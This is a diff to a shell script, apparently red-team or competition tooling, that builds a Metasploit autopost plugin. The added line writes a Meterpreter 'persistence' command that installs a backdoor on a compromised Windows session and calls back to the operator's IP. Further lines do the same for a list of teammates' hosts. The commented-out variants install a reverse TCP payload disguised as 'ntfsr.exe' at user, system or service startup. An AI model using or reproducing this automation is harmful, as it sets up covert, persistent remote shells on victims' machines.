@@ -49,7 +49,8 @@ fi
 rm /tmp/autopost.rb.* 2> /dev/null
 
 #  Lets setup the plugins!
-echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run persistence -S -U -X -i 30 -p '$TS_TEAM_PORT' -r /g' -e 's/$/\")/g' | tr '"' "'" > .msf/plugins/.autopost.source.persistence
+echo "session.run_cmd('run persistence -S -U -X -i 30 -p $TS_TEAM_PORT -r $TS_MY_IP')" > .msf/plugins/.autopost.source.persistence
+echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run persistence -S -U -X -i 30 -p '$TS_TEAM_PORT' -r /g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
 #echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run post\/windows\/manage\/persistence LPORT='$TS_TEAM_PORT' DELAY=1 STARTUP=USER HANDLER=false REXENAME=ntfsr.exe PAYLOAD_TYPE=TCP LHOST=/g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
 #echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run post\/windows\/manage\/persistence LPORT='$TS_TEAM_PORT' DELAY=1 STARTUP=SYSTEM HANDLER=false REXENAME=ntfsr.exe PAYLOAD_TYPE=TCP LHOST=/g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
 #echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run post\/windows\/manage\/persistence LPORT='$TS_TEAM_PORT' DELAY=1 STARTUP=SERVICE HANDLER=false REXENAME=ntfsr.exe PAYLOAD_TYPE=TCP LHOST=/g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
